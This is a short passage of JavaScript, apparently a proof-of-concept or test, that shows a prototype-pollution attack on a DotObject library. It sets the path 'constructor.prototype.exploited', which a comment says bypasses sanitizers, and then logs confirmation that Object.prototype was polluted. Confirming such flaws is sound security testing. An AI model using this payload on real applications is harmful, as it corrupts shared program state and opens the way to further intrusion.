    // flaw using the constructor chain, which bypasses engine sanitizers to pollute Object.prototype.
    new DotObject().set('constructor.prototype.exploited', true, obj);
    if ({}.exploited === true) {
      console.log('VULNERABILITY CONFIRMED: Object.prototype successfully polluted via constructor chain.');
